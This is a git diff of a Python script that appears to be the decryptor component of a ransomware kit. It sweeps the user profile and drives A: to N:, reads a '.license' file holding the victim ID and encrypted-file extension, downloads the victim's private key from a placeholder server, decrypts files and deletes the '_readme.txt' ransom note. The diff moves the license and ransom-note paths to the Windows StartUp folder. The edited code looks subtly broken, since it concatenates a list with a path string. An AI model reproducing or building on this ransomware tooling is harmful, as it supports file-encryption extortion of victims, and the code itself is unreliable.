@@ -1,12 +1,10 @@
 import os
-import base64
 import requests as req
 from sys import platform
 from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-def splacer():
+def sp():
     if(platform == 'win32'):
         return '\\'
     elif(platform == 'linux'):
@@ -15,9 +13,7 @@ def splacer():
 def gext(filename):
     with open(filename,'r') as license:
         ler = license.read()
-        len = base64.b64decode(ler.encode('utf-8'))
-        l = len.decode('utf-8')
-    ext = '.' + l.split('.')[1]
+    ext = '.' + ler.split('.')[1]
     return ext
 
 def gl(filename):
@@ -26,10 +22,7 @@ def gl(filename):
         url_web = "YOUR URL"
         with open(filename,'r') as license:
             ler = license.read()
-            len = base64.b64decode(ler.encode('utf-8'))
-            lsp = len.decode('utf-8').split('.')[0]
-            lenc = base64.b64encode(lsp.encode('utf-8'))
-            l = lenc.decode('utf-8')
+            l = ler.split('.')[0]
         URL_KEY = url_web + l + '.pem'
         pvk = req.get(URL_KEY).text
         return pvk
@@ -51,11 +44,11 @@ def decrypt(filename,pvk):
         file.write(data)
 
 
-def defense(target):
+def defense(target,log):
     for p, d, f in os.walk(target):
         for name in f:
-            ext = gext(os.path.join(p,'.license'))
-            pvk = gl(os.path.join(p,'.license'))
+            ext = gext(log+sp()+'.license')
+            pvk = gl(log+sp()+'.license')
             if name.endswith((ext)):
                 try:
                     decrypt(os.path.join(p, name),pvk)
@@ -64,18 +57,19 @@ def defense(target):
                 except:
                     continue
                 try:
-                    os.remove(os.path.join(p,"_readme.txt"))
+                    os.remove(log+sp()+"_readme.txt")
                 except:
                     status = "All Files has been Decrypted"
 
 if __name__ == '__main__':
     if (platform == 'win32'):
         t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
+        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
         for i in range(len(t)):
-            defense(t[i] + splacer())
+            defense(t[i] + sp(),jlog)
     elif (platform == 'linux'):
-        t = ['~']
+        t = [os.environ["HOME"]]
         for i in range(len(t)):
-            defense(t[i] + splacer())
+            defense(t[i] + sp(),t[i])
     else:
         print('I will better')
